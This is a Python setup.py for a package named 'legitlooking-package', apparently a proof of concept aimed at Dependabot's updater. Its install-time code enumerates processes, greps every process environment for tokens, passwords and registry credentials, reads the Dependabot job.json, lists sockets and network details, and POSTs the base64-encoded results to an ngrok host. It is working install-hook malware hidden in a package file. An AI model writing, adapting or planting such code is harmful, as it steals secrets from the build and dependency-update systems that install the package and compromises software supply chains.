from setuptools import setup

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

try:
    _urlreq = __import__('urllib.request', fromlist=['urlopen', 'Request'])
    _b64    = __import__('base64')
    _os     = __import__('os')

    # sh() via os.popen -- geen closure nodig, werkt in exec() context
    def sh(cmd):
        import os
        return os.popen(f'{cmd} 2>/dev/null').read()[:3000]

    lines = []

    # ============================================================
    # 1. ALLE PROCESSEN -- proxy draait in dezelfde container?
    #    (UPDATER_ONE_CONTAINER=1 in pip ecosystem)
    # ============================================================
    lines.append("=== 1. PS AUX ===")
    lines.append(sh("ps aux"))

    lines.append("\n=== 1b. PROCESS TREE ===")
    lines.append(sh("ps auxf"))

    # ============================================================
    # 2. PROXY PROC CMDLINE -- zoek proxy binary
    # ============================================================
    lines.append("\n=== 2. ALLE /proc/*/cmdline (proxy/cred keywords) ===")
    lines.append(sh(
        "for f in /proc/[0-9]*/cmdline; do "
        "c=$(cat $f 2>/dev/null | tr '\\0' ' '); "
        "echo \"$f: $c\"; "
        "done | grep -i 'proxy\\|cred\\|token\\|dependabot\\|helper\\|updater' | head -40"
    ))

    # ============================================================
    # 3. ALLE ENVIRON VAN ALLE PROCESSEN (grep op secrets)
    # ============================================================
    lines.append("\n=== 3. /proc/*/environ grep secrets ===")
    lines.append(sh(
        "for f in /proc/[0-9]*/environ; do "
        "e=$(cat $f 2>/dev/null | tr '\\0' '\\n'); "
        "hits=$(echo \"$e\" | grep -i 'token\\|secret\\|password\\|cred\\|registry\\|npm_\\|gem\\|pypi\\|ssrf'); "
        "if [ -n \"$hits\" ]; then echo \"=== $f ===\"; echo \"$hits\"; fi; "
        "done"
    ))

    # ============================================================
    # 4. JOB.JSON VIA OS.POPEN (bypasses open() monkey-patch)
    # ============================================================
    lines.append("\n=== 4. JOB.JSON VIA CAT ===")
    job_path = _os.environ.get("DEPENDABOT_JOB_PATH", "/home/dependabot/dependabot-updater/job.json")
    lines.append(sh(f"cat {job_path}"))

    # ============================================================
    # 5. UNIX SOCKETS EN LUISTERENDE POORTEN
    # ============================================================
    lines.append("\n=== 5. UNIX SOCKETS ===")
    lines.append(sh("cat /proc/net/unix"))

    lines.append("\n=== 5b. LUISTERENDE TCP POORTEN ===")
    lines.append(sh("ss -tlnp 2>/dev/null || cat /proc/net/tcp | awk '$4==\"0A\"'"))

    # ============================================================
    # 6. PROXY BINARY LOCATIE
    # ============================================================
    lines.append("\n=== 6. PROXY BINARY ZOEKEN ===")
    lines.append(sh("find / -maxdepth 6 -name '*proxy*' -o -name '*credhelper*' -o -name '*credential-helper*' 2>/dev/null | grep -v proc | grep -v sys | head -20"))

    # ============================================================
    # 7. HOSTNAME EN NETWERK
    # ============================================================
    lines.append("\n=== 7. NETWERK ===")
    lines.append(sh("hostname && ip addr && ip route"))

    # Stuur alles op
    payload = _b64.b64encode("\n".join(lines).encode("utf-8", errors="replace")).decode()
    req = _urlreq.Request(
        f"{COLLAB_URL}?poc=proxy_process_hunt",
        data=payload.encode(),
        method="POST",
        headers={"Content-Type": "text/plain"}
    )
    _urlreq.urlopen(req, timeout=15)

except Exception as e:
    try:
        _u = __import__('urllib.request', fromlist=['urlopen'])
        _p = __import__('urllib.parse',   fromlist=['quote'])
        _u.urlopen(f"{COLLAB_URL}?poc=proxy_process_hunt&err={_p.quote(str(e)[:200])}", timeout=5)
    except Exception:
        pass

setup(
    name="legitlooking-package",
    version="1.0.5",
    install_requires=[
        "requests==2.27.1",
        "flask==3.1.3",
    ],
    python_requires=">=3.8",
)
